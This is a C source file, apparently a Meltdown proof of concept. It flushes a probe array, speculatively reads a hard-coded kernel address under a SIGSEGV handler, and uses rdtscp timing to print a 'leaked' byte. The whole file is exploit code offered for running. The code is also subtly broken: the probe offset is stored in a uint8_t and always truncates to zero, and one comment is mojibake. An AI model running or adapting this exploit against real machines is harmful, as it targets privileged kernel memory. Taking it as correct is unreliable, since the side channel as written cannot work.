#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD 80
#define PAGE_SIZE 4096
#define ARRAY_SIZE 256

static sigjmp_buf env;
uint8_t probe_array[ARRAY_SIZE * PAGE_SIZE];
static volatile uint8_t leaked_value;

void clflush(void *addr) {
    _mm_clflush(addr);
}

static void handle_segfault(int sig) {
    siglongjmp(env, 1);
}

void setup_signal_handler() {
    struct sigaction sa;
    sa.sa_handler = handle_segfault;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
}

uint64_t rdtsc() {
    unsigned int aux;
    return __rdtscp(&aux);
}

void meltdown_attack(uint8_t *address) {
    setup_signal_handler();

    for (;;) {
        for (int i = 0; i < 256; i++) {
            clflush(&probe_array[i * PAGE_SIZE]);
        }

        _mm_mfence();

        if (sigsetjmp(env, 1) == 0) {
            // Speculative access
            uint8_t value = *address;
            uint8_t offset = value * PAGE_SIZE;
            volatile uint8_t temp = probe_array[offset];
        }

        for (int i = 0; i < 256; i++) {
            uint64_t t1 = rdtsc();
            volatile uint8_t temp = probe_array[i * PAGE_SIZE];
            uint64_t t2 = rdtsc() - t1;

            if (t2 < CACHE_HIT_THRESHOLD) {
                leaked_value = i;
                printf("Leaked byte: %02x (%c)\n", leaked_value,
                       (leaked_value >= 32 && leaked_value <= 126) ? leaked_value : '.');
                return;
            }
        }
    }
}

int main() {
    uint8_t *target = (uint8_t *)0xffffffff81000000; // DirecciÃ³n ejemplo del kernel
    meltdown_attack(target);
    return 0;
}
